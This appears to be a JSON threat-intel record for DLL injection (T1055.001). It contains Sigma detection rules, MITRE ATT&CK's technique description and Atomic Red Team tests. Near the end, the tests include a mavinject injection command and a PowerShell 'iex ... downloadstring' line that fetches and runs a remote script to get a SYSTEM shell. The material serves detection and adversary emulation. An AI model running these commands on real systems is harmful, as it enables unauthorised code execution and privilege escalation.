                            "raw": "author: Avneet Singh @v3t0_, oscd.community\ndate: 2020/10/18\ndescription: Detects potential DLL injection and execution using \"Tracker.exe\"\ndetection:\n  condition: all of selection_* and not 1 of filter_*\n  filter_msbuild1:\n    CommandLine|contains: ' /ERRORREPORT:PROMPT '\n  filter_msbuild2:\n    ParentImage|endswith:\n    - \\Msbuild\\Current\\Bin\\MSBuild.exe\n    - \\Msbuild\\Current\\Bin\\amd64\\MSBuild.exe\n  selection_cli:\n    CommandLine|contains:\n    - ' /d '\n    - ' /c '\n  selection_img:\n  - Image|endswith: \\tracker.exe\n  - Description: Tracker\nfalsepositives:\n- Unknown\nid: 148431ce-4b70-403d-8525-fcc2993f29ea\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2023/01/09\nreferences:\n- https://lolbas-project.github.io/lolbas/OtherMSBinaries/Tracker/\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.t1055.001\ntitle: Potential DLL Injection Or Execution Using Tracker.exe\n",
                            "sigma:id": "148431ce-4b70-403d-8525-fcc2993f29ea",
                            "title": "Potential DLL Injection Or Execution Using Tracker.exe",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "6309645e-122d-4c5b-bb2b-22e4f9c2fa42",
                        "lookup_data": {
                            "description": "Detects a possible remote threat creation with certain characteristics which are typical for Cobalt Strike beacons",
                            "raw": "author: Olaf Hartong, Florian Roth (Nextron Systems), Aleksey Potapov, oscd.community\ndate: 2018/11/30\ndescription: Detects a possible remote threat creation with certain characteristics\n  which are typical for Cobalt Strike beacons\ndetection:\n  condition: selection\n  selection:\n    StartAddress|endswith:\n    - 0B80\n    - 0C7C\n    - 0C88\nfalsepositives:\n- Unknown\nid: 6309645e-122d-4c5b-bb2b-22e4f9c2fa42\nlevel: high\nlogsource:\n  category: create_remote_thread\n  product: windows\nmodified: 2022/12/25\nreferences:\n- https://medium.com/@olafhartong/cobalt-strike-remote-threads-detection-206372d11d0f\n- https://blog.cobaltstrike.com/2018/04/09/cobalt-strike-3-11-the-snake-that-eats-its-tail/\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.t1055.001\ntitle: CobaltStrike Process Injection\n",
                            "sigma:id": "6309645e-122d-4c5b-bb2b-22e4f9c2fa42",
                            "title": "CobaltStrike Process Injection",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "17eb8e57-9983-420d-ad8a-2c4976c22eb8",
                        "lookup_data": {
                            "description": "Detects process injection using the signed Windows tool Mavinject32.exe",
                            "raw": "author: Florian Roth\ndate: 2018/12/12\ndescription: Detects process injection using the signed Windows tool Mavinject32.exe\ndetection:\n  condition: selection\n  selection:\n    CommandLine|contains: ' /INJECTRUNNING '\nfalsepositives:\n- unknown\nid: 17eb8e57-9983-420d-ad8a-2c4976c22eb8\nlevel: critical\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2020/09/01\nreferences:\n- https://twitter.com/gN3mes1s/status/941315826107510784\n- https://reaqta.com/2017/12/mavinject-microsoft-injector/\n- https://twitter.com/Hexacorn/status/776122138063409152\nstatus: experimental\ntags:\n- attack.t1055\n- attack.t1055.001\n- attack.t1218\ntitle: MavInject Process Injection\n",
                            "sigma:id": "17eb8e57-9983-420d-ad8a-2c4976c22eb8",
                            "title": "MavInject Process Injection",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "5df8df26-fe0e-4858-94a7-6cf71d9519c9",
                        "lookup_data": {
                            "description": "UEFI threats moving to the ESP: Introducing ESPecter bootkit",
                            "link": "https://www.circl.lu/doc/misp/feed-osint/5df8df26-fe0e-4858-94a7-6cf71d9519c9.json",
                            "misp:feed": "https://www.circl.lu/doc/misp/feed-osint",
                            "timestamp": "1637336858",
                            "uuid": "5df8df26-fe0e-4858-94a7-6cf71d9519c9",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "340a090b-c4e9-412e-bb36-b4b16fe96f9b",
                        "lookup_data": {
                            "description": "Detects a renamed dctask64.exe used for process injection, command execution, process creation with a signed binary by ZOHO Corporation",
                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2020/01/28\ndescription: Detects a renamed dctask64.exe used for process injection, command execution,\n  process creation with a signed binary by ZOHO Corporation\ndetection:\n  condition: selection and not filter\n  filter:\n    Image|endswith: \\dctask64.exe\n  selection:\n    Hashes|contains: 6834B1B94E49701D77CCB3C0895E1AFD\nfalsepositives:\n- Unknown yet\nfields:\n- CommandLine\n- ParentCommandLine\n- ParentImage\nid: 340a090b-c4e9-412e-bb36-b4b16fe96f9b\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2021/12/08\nreferences:\n- https://twitter.com/gN3mes1s/status/1222088214581825540\n- https://twitter.com/gN3mes1s/status/1222095963789111296\n- https://twitter.com/gN3mes1s/status/1222095371175911424\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.t1036\n- attack.t1055.001\n- attack.t1202\n- attack.t1218\ntitle: Renamed ZOHO Dctask64\n",
                            "sigma:id": "340a090b-c4e9-412e-bb36-b4b16fe96f9b",
                            "title": "Renamed ZOHO Dctask64",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "6345b048-8441-43a7-9bed-541133633d7a",
                        "lookup_data": {
                            "description": "Detects suspicious process injection using ZOHO's dctask64.exe",
                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2020/01/28\ndescription: Detects suspicious process injection using ZOHO's dctask64.exe\ndetection:\n  condition: selection and not filter\n  filter:\n    CommandLine|contains: DesktopCentral_Agent\\agent\n  selection:\n    Image|endswith: \\dctask64.exe\nfalsepositives:\n- Unknown yet\nfields:\n- CommandLine\n- ParentCommandLine\n- ParentImage\nid: 6345b048-8441-43a7-9bed-541133633d7a\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2021/11/27\nreferences:\n- https://twitter.com/gN3mes1s/status/1222088214581825540\n- https://twitter.com/gN3mes1s/status/1222095963789111296\n- https://twitter.com/gN3mes1s/status/1222095371175911424\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.t1055.001\ntitle: ZOHO Dctask64 Process Injection\n",
                            "sigma:id": "6345b048-8441-43a7-9bed-541133633d7a",
                            "title": "ZOHO Dctask64 Process Injection",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "052ec6f6-1adc-41e6-907a-f1c813478bee",
                        "lookup_data": {
                            "description": "Detects potential use of CreateRemoteThread api and LoadLibrary function to inject DLL into a process",
                            "raw": "author: Roberto Rodriguez @Cyb3rWard0g\ndate: 2019/08/11\ndescription: Detects potential use of CreateRemoteThread api and LoadLibrary function\n  to inject DLL into a process\ndetection:\n  condition: selection\n  selection:\n    StartFunction: LoadLibraryA\n    StartModule|endswith: \\kernel32.dll\nfalsepositives:\n- Unknown\nid: 052ec6f6-1adc-41e6-907a-f1c813478bee\nlevel: high\nlogsource:\n  category: create_remote_thread\n  product: windows\nmodified: 2021/11/27\nreferences:\n- https://threathunterplaybook.com/notebooks/windows/05_defense_evasion/WIN-180719170510.html\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.t1055.001\ntitle: CreateRemoteThread API and LoadLibrary\n",
                            "sigma:id": "052ec6f6-1adc-41e6-907a-f1c813478bee",
                            "title": "CreateRemoteThread API and LoadLibrary",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "5f113a8f-8b61-41ca-b90f-d374fa7e4a39",
                        "lookup_data": {
                            "description": "Detects the access to processes by other suspicious processes which have reflectively loaded libraries in their memory space. An example is SilentTrinity C2 behaviour. Generally speaking, when Sysmon EventID 10 cannot reference a stack call to a dll loaded from disk (the standard way), it will display \"UNKNOWN\" as the module name. Usually this means the stack call points to a module that was reflectively loaded in memory. Adding to this, it is not common to see such few calls in the stack (ntdll.dll --> kernelbase.dll --> unknown) which essentially means that most of the functions required by the process to execute certain routines are already present in memory, not requiring any calls to external libraries. The latter should also be considered suspicious.",
                            "raw": "author: Perez Diego (@darkquassar), oscd.community, Jonhnathan Ribeiro\ndate: 2019/10/27\ndescription: Detects the access to processes by other suspicious processes which have\n  reflectively loaded libraries in their memory space. An example is SilentTrinity\n  C2 behaviour. Generally speaking, when Sysmon EventID 10 cannot reference a stack\n  call to a dll loaded from disk (the standard way), it will display \"UNKNOWN\" as\n  the module name. Usually this means the stack call points to a module that was reflectively\n  loaded in memory. Adding to this, it is not common to see such few calls in the\n  stack (ntdll.dll --> kernelbase.dll --> unknown) which essentially means that most\n  of the functions required by the process to execute certain routines are already\n  present in memory, not requiring any calls to external libraries. The latter should\n  also be considered suspicious.\ndetection:\n  condition: (selection1 or selection2) or (selection3 and granted_access) and not\n    filter\n  filter:\n    SourceImage|endswith:\n    - \\Windows\\System32\\sdiagnhost.exe\n  granted_access:\n    GrantedAccess:\n    - '0x1F0FFF'\n    - '0x1F1FFF'\n    - '0x143A'\n    - '0x1410'\n    - '0x1010'\n    - '0x1F2FFF'\n    - '0x1F3FFF'\n    - '0x1FFFFF'\n  selection1:\n    CallTrace|contains|all:\n    - C:\\\\Windows\\\\SYSTEM32\\\\ntdll.dll+\n    - '|C:\\\\Windows\\\\System32\\\\KERNELBASE.dll+'\n    - '|UNKNOWN('\n    - )\n  selection2:\n    CallTrace|contains|all:\n    - UNKNOWN(\n    - )|UNKNOWN(\n    CallTrace|endswith: )\n  selection3:\n    CallTrace|contains: UNKNOWN\nfalsepositives:\n- Low\nfields:\n- ComputerName\n- User\n- SourceImage\n- TargetImage\n- CallTrace\nid: 5f113a8f-8b61-41ca-b90f-d374fa7e4a39\nlevel: critical\nlogsource:\n  category: process_access\n  product: windows\nmodified: 2021/05/16\nreferences:\n- https://azure.microsoft.com/en-ca/blog/detecting-in-memory-attacks-with-sysmon-and-azure-security-center/\nstatus: experimental\ntags:\n- attack.privilege_escalation\n- attack.defense_evasion\n- attack.t1055.001\n- attack.t1055.002\n- attack.t1055\ntitle: Suspicious In-Memory Module Execution\n",
                            "sigma:id": "5f113a8f-8b61-41ca-b90f-d374fa7e4a39",
                            "title": "Suspicious In-Memory Module Execution",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "f4599aa0-4f85-4a32-80ea-fc39dc965945",
                        "lookup_data": {
                            "mitre-attack-id": "T1055.001",
                            "mitre-cti:description": "Adversaries may inject dynamic-link libraries (DLLs) into processes in order to evade process-based defenses as well as possibly elevate privileges. DLL injection is a method of executing arbitrary code in the address space of a separate live process.  \n\nDLL injection is commonly performed by writing the path to a DLL in the virtual address space of the target process before loading the DLL by invoking a new thread. The write can be performed with native Windows API calls such as <code>VirtualAllocEx</code> and <code>WriteProcessMemory</code>, then invoked with <code>CreateRemoteThread</code> (which calls the <code>LoadLibrary</code> API responsible for loading the DLL). (Citation: Elastic Process Injection July 2017) \n\nVariations of this method such as reflective DLL injection (writing a self-mapping DLL into a process) and memory module (map DLL when writing into process) overcome the address relocation issue as well as the additional APIs to invoke execution (since these methods load and execute the files in memory by manually preforming the function of <code>LoadLibrary</code>).(Citation: Elastic HuntingNMemory June 2017)(Citation: Elastic Process Injection July 2017) \n\nAnother variation of this method, often referred to as Module Stomping/Overloading or DLL Hollowing, may be leveraged to conceal injected code within a process. This method involves loading a legitimate DLL into a remote process then manually overwriting the module's <code>AddressOfEntryPoint</code> before starting a new thread in the target process.(Citation: Module Stomping for Shellcode Injection) This variation allows attackers to hide malicious injected code by potentially backing its execution with a legitimate DLL file on disk.(Citation: Hiding Malicious Code with Module Stomping) \n\nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via DLL injection may also evade detection from security products since the execution is masked under a legitimate process. ",
                            "mitre-cti:name": "Dynamic-link Library Injection",
                            "mitre-cti:type": "attack-pattern",
                            "raw": "{'modified': '2022-10-18T21:07:23.748Z', 'name': 'Dynamic-link Library Injection', 'description': \"Adversaries may inject dynamic-link libraries (DLLs) into processes in order to evade process-based defenses as well as possibly elevate privileges. DLL injection is a method of executing arbitrary code in the address space of a separate live process.  \\n\\nDLL injection is commonly performed by writing the path to a DLL in the virtual address space of the target process before loading the DLL by invoking a new thread. The write can be performed with native Windows API calls such as <code>VirtualAllocEx</code> and <code>WriteProcessMemory</code>, then invoked with <code>CreateRemoteThread</code> (which calls the <code>LoadLibrary</code> API responsible for loading the DLL). (Citation: Elastic Process Injection July 2017) \\n\\nVariations of this method such as reflective DLL injection (writing a self-mapping DLL into a process) and memory module (map DLL when writing into process) overcome the address relocation issue as well as the additional APIs to invoke execution (since these methods load and execute the files in memory by manually preforming the function of <code>LoadLibrary</code>).(Citation: Elastic HuntingNMemory June 2017)(Citation: Elastic Process Injection July 2017) \\n\\nAnother variation of this method, often referred to as Module Stomping/Overloading or DLL Hollowing, may be leveraged to conceal injected code within a process. This method involves loading a legitimate DLL into a remote process then manually overwriting the module's <code>AddressOfEntryPoint</code> before starting a new thread in the target process.(Citation: Module Stomping for Shellcode Injection) This variation allows attackers to hide malicious injected code by potentially backing its execution with a legitimate DLL file on disk.(Citation: Hiding Malicious Code with Module Stomping) \\n\\nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via DLL injection may also evade detection from security products since the execution is masked under a legitimate process. \", 'kill_chain_phases': [{'kill_chain_name': 'mitre-attack', 'phase_name': 'defense-evasion'}, {'kill_chain_name': 'mitre-attack', 'phase_name': 'privilege-escalation'}], 'x_mitre_detection': 'Monitoring Windows API calls indicative of the various types of code injection may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances for known bad sequences of calls, since benign use of API functions may be common and difficult to distinguish from malicious behavior. Windows API calls such as <code>CreateRemoteThread</code> and those that can be used to modify memory within another process, such as <code>VirtualAllocEx</code>/<code>WriteProcessMemory</code>, may be used for this technique.(Citation: Elastic Process Injection July 2017)\\n\\nMonitor DLL/PE file events, specifically creation of these binary files as well as the loading of DLLs into processes. Look for DLLs that are not recognized or not normally loaded into a process. \\n\\nAnalyze process behavior to determine if a process is performing actions it usually does not, such as opening network connections, reading files, or other suspicious actions that could relate to post-compromise behavior. ', 'x_mitre_platforms': ['Windows'], 'x_mitre_is_subtechnique': True, 'x_mitre_deprecated': False, 'x_mitre_domains': ['enterprise-attack'], 'x_mitre_version': '1.2', 'x_mitre_contributors': ['Boominathan Sundaram'], 'x_mitre_data_sources': ['Process: Process Metadata', 'Process: OS API Execution', 'Process: Process Access', 'Process: Process Modification', 'Module: Module Load'], 'x_mitre_defense_bypassed': ['Application control', 'Anti-virus'], 'x_mitre_permissions_required': ['User'], 'type': 'attack-pattern', 'id': 'attack-pattern--f4599aa0-4f85-4a32-80ea-fc39dc965945', 'created': '2020-01-14T01:26:08.145Z', 'created_by_ref': 'identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5', 'revoked': False, 'external_references': [{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/techniques/T1055/001', 'external_id': 'T1055.001'}, {'source_name': 'Hiding Malicious Code with Module Stomping', 'description': 'Aliz Hammond. (2019, August 15). Hiding Malicious Code with \"Module Stomping\": Part 1. Retrieved July 14, 2022.', 'url': 'https://blog.f-secure.com/hiding-malicious-code-with-module-stomping/'}, {'source_name': 'Elastic HuntingNMemory June 2017', 'description': 'Desimone, J. (2017, June 13). Hunting in Memory. Retrieved December 7, 2017.', 'url': 'https://www.endgame.com/blog/technical-blog/hunting-memory'}, {'source_name': 'Elastic Process Injection July 2017', 'description': 'Hosseini, A. (2017, July 18). Ten Process Injection Techniques: A Technical Survey Of Common And Trending Process Injection Techniques. Retrieved December 7, 2017.', 'url': 'https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process'}, {'source_name': 'Module Stomping for Shellcode Injection', 'description': 'Red Teaming Experiments. (n.d.). Module Stomping for Shellcode Injection. Retrieved July 14, 2022.', 'url': 'https://www.ired.team/offensive-security/code-injection-process-injection/modulestomping-dll-hollowing-shellcode-injection'}], 'object_marking_refs': ['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168'], 'x_mitre_attack_spec_version': '2.1.0', 'x_mitre_modified_by_ref': 'identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5'}",
                            "_cycat_type": "Item"
                        }
                    }
                ]
            }
        },
        "atomics": [
            {
                "attack_technique": "T1055.001",
                "display_name": "Process Injection: Dynamic-link Library Injection",
                "atomic_tests": [
                    {
                        "name": "Process Injection via mavinject.exe",
                        "auto_generated_guid": "74496461-11a1-4982-b439-4d87a550d254",
                        "description": "Windows 10 Utility To Inject DLLS.\n\nUpon successful execution, powershell.exe will download T1055.dll to disk. Powershell will then spawn mavinject.exe to perform process injection in T1055.dll.\nWith default arguments, expect to see a MessageBox, with notepad's icon in taskbar.\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "input_arguments": {
                            "process_id": {
                                "description": "PID of input_arguments",
                                "type": "string",
                                "default": "(Start-Process notepad -PassThru).id"
                            },
                            "dll_payload": {
                                "description": "DLL to Inject",
                                "type": "path",
                                "default": "PathToAtomicsFolder\\T1055.001\\src\\x64\\T1055.001.dll"
                            }
                        },
                        "dependency_executor_name": "powershell",
                        "dependencies": [
                            {
                                "description": "Utility to inject must exist on disk at specified location (#{dll_payload})\n",
                                "prereq_command": "if (Test-Path \"#{dll_payload}\") {exit 0} else {exit 1}\n",
                                "get_prereq_command": "New-Item -Type Directory (split-path \"#{dll_payload}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1055.001/src/x64/T1055.001.dll\" -OutFile \"#{dll_payload}\"\n"
                            }
                        ],
                        "executor": {
                            "command": "$mypid = #{process_id}\nmavinject $mypid /INJECTRUNNING \"#{dll_payload}\"\nStop-Process -processname notepad\n",
                            "name": "powershell",
                            "elevation_required": true
                        }
                    },
                    {
                        "name": "WinPwn - Get SYSTEM shell - Bind System Shell using UsoClient DLL load technique",
                        "auto_generated_guid": "8b56f787-73d9-4f1d-87e8-d07e89cbc7f5",
                        "description": "Get SYSTEM shell - Bind System Shell using UsoClient DLL load technique via function of WinPwn",
                        "supported_platforms": [
                            "windows"
                        ],
                        "executor": {
                            "command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/UsoDLL/Get-UsoClientDLLSystem.ps1')",
                            "name": "powershell"
                        }
                    }
                ]
            }
        ]
    },
    "timestamp": "2025-02-28 11:46:18"
}